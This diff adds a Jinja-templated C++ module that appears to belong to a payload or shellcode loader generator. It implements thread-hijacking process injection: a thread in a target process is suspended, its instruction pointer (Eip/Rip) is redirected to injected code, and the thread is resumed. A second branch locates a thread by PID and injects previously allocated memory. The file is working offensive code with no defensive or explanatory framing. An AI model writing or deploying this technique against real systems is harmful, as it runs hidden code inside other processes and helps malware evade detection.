@@ -1,0 +1,39 @@
+{% if section == "globals" %}
+    {% if link.alloc.functions.value in ["dynamic", "direct"] %}
+        {{ function_typedef("SuspendThread") }}
+        {{ function_typedef("GetThreadContext") }}
+        {{ function_typedef("SetThreadContext") }}
+        {{ function_typedef("ResumeThread") }}
+    {% endif %}
+
+    {% include "lib/find_thread.cpp" %}
+
+    int inject(HANDLE hThread, void *pRemoteCode){
+        {{ function_definition("SuspendThread") }}
+        {{ function_definition("GetThreadContext") }}
+        {{ function_definition("SetThreadContext") }}
+        {{ function_definition("ResumeThread") }}
+        CONTEXT ctx;
+        ctx.ContextFlags = CONTEXT_FULL;
+
+        pSuspendThread(hThread);
+        pGetThreadContext(hThread, &ctx);
+{# TODO: handle different arch #}
+#ifdef _M_IX86 
+	ctx.Eip = (DWORD_PTR) pRemoteCode;
+#else
+	ctx.Rip = (DWORD_PTR) pRemoteCode;
+#endif
+        pSetThreadContext(hThread, &ctx);
+        return pResumeThread(hThread);
+    }
+{% else %}
+    {# PID left from alloc_basic_remote section #}
+    HANDLE hThread = FindThread(pid);
+    if (hThread == NULL) {
+        printf("[-] Failed to aquire thread handle\n");
+        return 0;
+    }
+
+    inject(hThread, mem);
+{% endif %}
